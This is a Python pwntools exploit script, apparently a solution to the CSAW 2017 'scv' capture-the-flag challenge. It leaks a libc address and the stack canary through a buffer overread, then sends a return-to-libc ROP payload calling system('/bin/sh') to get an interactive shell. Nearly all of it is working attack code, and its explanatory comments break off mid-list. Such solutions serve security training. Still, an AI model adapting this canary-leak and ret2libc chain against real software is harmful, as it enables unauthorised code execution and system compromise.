#!/usr/bin/env python

from pwn import *
import os
import sys

# ld libc with
# export LD_LIBRARY_PATH=/root/CSAW/
#
# CSAW 2017 `scv` writeup
#
# This pwn is a return-to-libc challange.
# nx true, everything else false
#
# To solve it following artefacts is needed:
#   1. the offsets in libc
#       a) sym.system function
#       b) sym.__cxa_atexit
#   2. "/bin/sh" address 
#
# It can be solved by a three step solution:
#   1. Get system function address
#   2. 

# pxr @rsp
# dmi

DEBUG = False

scv = "./scv"

# offsets from libc
atexit_offset  = 0x0003a280
system_offset  = 0x00045390
exit_offset    = 0x0003a030
_bin_sh_offset = 0x0018cd17 # strings -tx libc.so.6 | grep bin
pop_rdi_ret    = 0x00400ea3 # /R pop rdi

unpacker = make_unpacker(64, endian='little', sign='unsigned')
packer = make_packer(64, endian='little', sign='unsigned')

def setup_debug():
    context.arch = 'amd64'
    proc = process(scv)
    #proc = remote('pwn.cha1.csaw.io', 3764)
    pid = util.proc.pidof(proc)[0]

    c = ""
    c += "aaaa; "
    c += "db main; "
    c += "db 0x00400aaa; "
    #c += "db 0x00400b0a; "
    #c += "db 0x004008d0; "
    #c += "db __cxa_atexit; "
    c += "db 0x00400dd7; "
    c += "db 0x00400dde; "
    c += "db; "

    if DEBUG:
        os.system('screen r2 -d %d -c "%s"' % (pid, c)) # open radare2 in debug mode
        util.proc.wait_for_debugger(pid) # wait for debugger
    return proc    

def main(proc):

    try:
        proc.recvuntil('>>')
        proc.sendline('1')
        proc.recvuntil('>>')
        proc.send('A' * 40)

        proc.recvuntil('>>')
        proc.sendline('2')
	
        for i in range(5): # skip junk
            proc.recvline()
        proc.recvn(40) # skip 'A' * 40

        __cxa_atexit = proc.recvn(6) + '\x00\x00' # get <__cxa_atexit+25>
        __cxa_atexit = unpacker(__cxa_atexit) - 0x19

        libc = __cxa_atexit - atexit_offset
        system = libc + system_offset
        _bin_sh = libc + _bin_sh_offset
        exit_0 = libc + exit_offset

        print "[+] sym.imp.__cxa_atexit 0x%x" % __cxa_atexit
        print "[+] libc 0x%x" % libc
        print "[+] sym.imp.system 0x%x" % system
        print "[+] /bin/sh 0x%x" % _bin_sh
        print "[+] exit_0 0x%x" % exit_0
        print "[+] pop_rdi_ret 0x%x" % pop_rdi_ret

        proc.recvuntil('>>')
        proc.sendline('1')
        proc.recvuntil('>>')

        # fill until stack canary to overwrite \x00 terminator, to reveil stack canary
        proc.send('A' * 169)
        proc.recvuntil('>>') # read buffer
        proc.sendline('2')

        for i in range(5): # skip junk
            proc.recvline()

        # 2. read stack canary
        rd = proc.recvline()[168:176]
        stack_canary = unpacker(rd) & 0xffffffffffffff00 # unpack stack canary and set the left most bytes to \x00 

        proc.recvuntil('>>')
        proc.sendline('1')
        proc.recvuntil('>>')
        proc.send('A' * 184) # fill until return adress

        proc.recvuntil('>>')
        proc.sendline('2')

        for i in range(5): # skip junk
            proc.recvline()
        rd = proc.recvn(6) + '\x00' # get return adress
	
        # create exploit payload
        payload = ""
        payload += '\x90' * 168
        payload += packer(stack_canary)
        payload += '\x00' * 8

	    # return address
        payload += packer(pop_rdi_ret)
        payload += packer(_bin_sh)
        payload += packer(system)
        payload += '\x00' * 40

        proc.sendline('1')
        proc.recvuntil('>>')
        proc.send(payload)
        
        proc.recvuntil('>>')
        proc.sendline('3')

        proc.interactive()

    except Exception as e:
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        print "[!] Error on line %d: %s" % (exc_tb.tb_lineno, e)

if __name__ == "__main__":
    proc = setup_debug()
    main(proc)
